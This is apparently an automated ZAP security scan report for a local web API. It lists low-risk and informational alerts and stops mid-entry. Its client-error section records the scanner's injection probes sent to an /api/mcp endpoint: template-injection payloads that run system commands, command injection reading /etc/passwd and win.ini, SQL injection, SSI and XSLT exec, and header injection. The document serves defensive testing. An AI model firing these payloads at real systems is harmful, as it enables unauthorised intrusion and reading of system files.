# ZAP Scanning Report

ZAP by [Checkmarx](https://checkmarx.com/).


## Summary of Alerts

| Risk Level | Number of Alerts |
| --- | --- |
| High | 0 |
| Medium | 0 |
| Low | 2 |
| Informational | 3 |




## Insights

| Level | Reason | Site | Description | Statistic |
| --- | --- | --- | --- | --- |
| Medium | Exceeded High | http://proxy:8080 | Percentage of responses with status code 4xx | 97 % |
| Info | Informational | http://proxy:8080 | Percentage of responses with status code 2xx | 16 % |
| Info | Informational | http://proxy:8080 | Percentage of responses with status code 3xx | 1 % |
| Info | Informational | http://proxy:8080 | Percentage of endpoints with content type application/json | 8 % |
| Info | Informational | http://proxy:8080 | Percentage of endpoints with content type text/html | 9 % |
| Info | Informational | http://proxy:8080 | Percentage of endpoints with content type text/plain | 3 % |
| Info | Informational | http://proxy:8080 | Percentage of endpoints with method GET | 17 % |
| Info | Informational | http://proxy:8080 | Percentage of endpoints with method POST | 82 % |
| Info | Informational | http://proxy:8080 | Count of total endpoints | 160    |
| Info | Informational | http://proxy:8080 | Percentage of slow responses | 2 % |







## Alerts

| Name | Risk Level | Number of Instances |
| --- | --- | --- |
| Cross-Origin-Resource-Policy Header Missing or Invalid | Low | 1 |
| Unexpected Content-Type was returned | Low | 16 |
| A Client Error response code was returned by the server | Informational | 157 |
| Non-Storable Content | Informational | Systemic |
| Storable and Cacheable Content | Informational | 1 |




## Alert Detail



### [ Cross-Origin-Resource-Policy Header Missing or Invalid ](https://www.zaproxy.org/docs/alerts/90004/)



##### Low (Medium)

### Description

Cross-Origin-Resource-Policy header is an opt-in header designed to counter side-channels attacks like Spectre. Resource should be specifically set as shareable amongst different origins.

* URL: http://proxy:8080/api/health
  * Node Name: `http://proxy:8080/api/health`
  * Method: `GET`
  * Parameter: `Cross-Origin-Resource-Policy`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``


Instances: 1

### Solution

Ensure that the application/web server sets the Cross-Origin-Resource-Policy header appropriately, and that it sets the Cross-Origin-Resource-Policy header to 'same-origin' for all web pages.
'same-site' is considered as less secured and should be avoided.
If resources must be shared, set the header to 'cross-origin'.
If possible, ensure that the end user uses a standards-compliant and modern web browser that supports the Cross-Origin-Resource-Policy header (https://caniuse.com/mdn-http_headers_cross-origin-resource-policy).

### Reference


* [ https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cross-Origin-Embedder-Policy ](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cross-Origin-Embedder-Policy)


#### CWE Id: [ 693 ](https://cwe.mitre.org/data/definitions/693.html)


#### WASC Id: 14

#### Source ID: 3

### [ Unexpected Content-Type was returned ](https://www.zaproxy.org/docs/alerts/100001/)



##### Low (High)

### Description

A Content-Type of text/html was returned by the server.
This is not one of the types expected to be returned by an API.
Raised by the 'Alert on Unexpected Content Types' script

* URL: http://proxy:8080
  * Node Name: `http://proxy:8080`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `text/html`
  * Other Info: ``
* URL: http://proxy:8080/
  * Node Name: `http://proxy:8080/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `text/html`
  * Other Info: ``
* URL: http://proxy:8080/3310283583361757672
  * Node Name: `http://proxy:8080/3310283583361757672`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `text/html`
  * Other Info: ``
* URL: http://proxy:8080/api
  * Node Name: `http://proxy:8080/api`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `text/html`
  * Other Info: ``
* URL: http://proxy:8080/api/
  * Node Name: `http://proxy:8080/api/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `text/html`
  * Other Info: ``
* URL: http://proxy:8080/api/6937608799120323631
  * Node Name: `http://proxy:8080/api/6937608799120323631`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `text/html`
  * Other Info: ``
* URL: http://proxy:8080/api/actuator/health
  * Node Name: `http://proxy:8080/api/actuator/health`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `text/html`
  * Other Info: ``
* URL: http://proxy:8080/api/tts
  * Node Name: `http://proxy:8080/api/tts`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `text/html`
  * Other Info: ``
* URL: http://proxy:8080/api/tts/
  * Node Name: `http://proxy:8080/api/tts/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `text/html`
  * Other Info: ``
* URL: http://proxy:8080/api/tts/6326368014128124525
  * Node Name: `http://proxy:8080/api/tts/6326368014128124525`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `text/html`
  * Other Info: ``
* URL: http://proxy:8080/beranda
  * Node Name: `http://proxy:8080/beranda`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `text/html`
  * Other Info: ``
* URL: http://proxy:8080/tts
  * Node Name: `http://proxy:8080/tts`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `text/html`
  * Other Info: ``
* URL: http://proxy:8080/tts/
  * Node Name: `http://proxy:8080/tts/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `text/html`
  * Other Info: ``
* URL: http://proxy:8080/metadata/instance
  * Node Name: `http://proxy:8080/metadata/instance`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `text/html`
  * Other Info: ``
* URL: http://proxy:8080/metadata/v1
  * Node Name: `http://proxy:8080/metadata/v1`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `text/html`
  * Other Info: ``
* URL: http://proxy:8080/openstack/latest/meta_data.json
  * Node Name: `http://proxy:8080/openstack/latest/meta_data.json`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `text/html`
  * Other Info: ``


Instances: 16

### Solution



### Reference




#### Source ID: 4

### [ A Client Error response code was returned by the server ](https://www.zaproxy.org/docs/alerts/100000/)



##### Informational (High)

### Description

A response code of 401 was returned by the server.
This may indicate that the application is failing to handle unexpected input correctly.
Raised by the 'Alert on HTTP Response Code Error' script

* URL: http://proxy:8080/3310283583361757672
  * Node Name: `http://proxy:8080/3310283583361757672`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api
  * Node Name: `http://proxy:8080/api`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/
  * Node Name: `http://proxy:8080/api/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/6937608799120323631
  * Node Name: `http://proxy:8080/api/6937608799120323631`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/actuator/health
  * Node Name: `http://proxy:8080/api/actuator/health`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/apk
  * Node Name: `http://proxy:8080/api/apk`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: http://proxy:8080/api/apk/
  * Node Name: `http://proxy:8080/api/apk/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: http://proxy:8080/api/internal
  * Node Name: `http://proxy:8080/api/internal`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/internal/
  * Node Name: `http://proxy:8080/api/internal/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/internal/4118632064268778143
  * Node Name: `http://proxy:8080/api/internal/4118632064268778143`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/media
  * Node Name: `http://proxy:8080/api/media`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `405`
  * Other Info: ``
* URL: http://proxy:8080/api/media/
  * Node Name: `http://proxy:8080/api/media/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `405`
  * Other Info: ``
* URL: http://proxy:8080/api/media/4050279121744578266
  * Node Name: `http://proxy:8080/api/media/4050279121744578266`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: http://proxy:8080/api/media/id
  * Node Name: `http://proxy:8080/api/media/id`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: http://proxy:8080/api/media/id/
  * Node Name: `http://proxy:8080/api/media/id/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: http://proxy:8080/api/tts
  * Node Name: `http://proxy:8080/api/tts`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/tts/
  * Node Name: `http://proxy:8080/api/tts/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/tts/6326368014128124525
  * Node Name: `http://proxy:8080/api/tts/6326368014128124525`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/tts/today
  * Node Name: `http://proxy:8080/api/tts/today`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: http://proxy:8080/api/tts/today/
  * Node Name: `http://proxy:8080/api/tts/today/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: http://proxy:8080/tts
  * Node Name: `http://proxy:8080/tts`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/tts/
  * Node Name: `http://proxy:8080/tts/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/tts/2211524829734622878
  * Node Name: `http://proxy:8080/tts/2211524829734622878`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: http://proxy:8080/tts/file
  * Node Name: `http://proxy:8080/tts/file`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: http://proxy:8080/tts/file/
  * Node Name: `http://proxy:8080/tts/file/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: http://proxy:8080/api/heartbeat
  * Node Name: `http://proxy:8080/api/heartbeat`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: http://proxy:8080/api/heartbeat/
  * Node Name: `http://proxy:8080/api/heartbeat/`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: http://proxy:8080/api/internal/weekly-report
  * Node Name: `http://proxy:8080/api/internal/weekly-report ()({orgId,learnerId,weekStart})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/internal/weekly-report/
  * Node Name: `http://proxy:8080/api/internal/weekly-report/ ()({orgId,learnerId,weekStart})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("#set($engine=\"\")\n#set($proc=$engine.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"sleep 15\"))\n#set($null=$proc.waitFor())\n${null}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("#{%x(sleep 15)}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("#{global.process.mainModule.require('child_process').execSync('sleep 15').toString()}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}\\")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("${__import__(\"subprocess\").check_output(\"sleep 15\", shell=True)}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("'(")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("';print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var='")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("+response.write({0}*{1})+")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("4900122706544996764.owasp.org")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("5;URL='https://4900122706544996764.owasp.org'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("5;URL='https://4900122706544996764.owasp.org/?John Doe'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()(";")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()(";print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("<!--")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("<!--#EXEC cmd=\"dir \\\"-->")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("<!--#EXEC cmd=\"ls /\"-->")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("<")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"sleep 15\") }")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("<%= global.process.mainModule.require('child_process').execSync('sleep 15').toString()%>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("<%=%x(sleep 15)%>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("<xsl:value-of select=\"document('http://proxy:22')\"/>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("<xsl:value-of select=\"php:function('exec','erroneous_command 2>&amp;1')\"/>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("<xsl:value-of select=\"system-property('xsl:vendor')\"/>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("<xsl:value-of select=\"system-property('xsl:vendor')\"/><!--")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("<xsl:variable name=\"rtobject\" select=\"runtime:getRuntime()\"/>\n<xsl:variable name=\"process\" select=\"runtime:exec($rtobject,'erroneous_command')\"/>\n<xsl:variable name=\"waiting\" select=\"process:waitFor($process)\"/>\n<xsl:value-of select=\"$process\"/>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("John Doe AND 1=1 -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("John Doe AND 1=2 -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("John Doe OR 1=1 -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("John Doe UNION ALL select NULL -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("John Doe")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("John Doe&cat /etc/passwd&")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("John Doe&type %SYSTEMROOT%\\win.ini")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("John Doe' AND '1'='1' -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("John Doe' AND '1'='2' -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("John Doe' OR '1'='1' -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("John Doe' UNION ALL select NULL -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("John Doe'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("John Doe'&cat /etc/passwd&'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("John Doe'&type %SYSTEMROOT%\\win.ini&'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("John Doe'(")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("John Doe') UNION ALL select NULL -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("John Doe';cat /etc/passwd;'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("John Doe';get-help")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("John Doe'|type %SYSTEMROOT%\\win.ini")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("John Doe) UNION ALL select NULL -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("John Doe;")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("John Doe;cat /etc/passwd;")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("John Doe;get-help #")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("John Doe;get-help")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("John Doe\" UNION ALL select NULL -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("John Doe\"")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("John Doe\"&cat /etc/passwd&\"")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("John Doe\"&type %SYSTEMROOT%\\win.ini&\"")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("John Doe\";cat /etc/passwd;\"")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("John Doe\";get-help")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("John Doe\"|type %SYSTEMROOT%\\win.ini")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("John Doe|type %SYSTEMROOT%\\win.ini")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("Set-cookie: Tamper=84e3a428-32c8-405a-ac14-4f696277dd28")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("URL='http://4900122706544996764.owasp.org'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("ZAP %1!s%2!s%3!s%4!s%5!s%6!s%7!s%8!s%9!s%10!s%11!s%12!s%13!s%14!s%15!s%16!s%17!s%18!s%19!s%20!s%21!n%22!n%23!n%24!n%25!n%26!n%27!n%28!n%29!n%30!n%31!n%32!n%33!n%34!n%35!n%36!n%37!n%38!n%39!n%40!n\n")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("ZAP")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("ZAP%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s\n")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("\"")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("\"'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("\"+response.write(846,203*593,432)+\"")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("\"/><xsl:value-of select=\"system-property('xsl:vendor')\"/><!--")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("\";print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var=\"")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("\"><!--#EXEC cmd=\"dir \\\"--><")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("\"><!--#EXEC cmd=\"ls /\"--><")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("]]>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("any?\nSet-cookie: Tamper=84e3a428-32c8-405a-ac14-4f696277dd28")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("any?\r\nSet-cookie: Tamper=84e3a428-32c8-405a-ac14-4f696277dd28")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
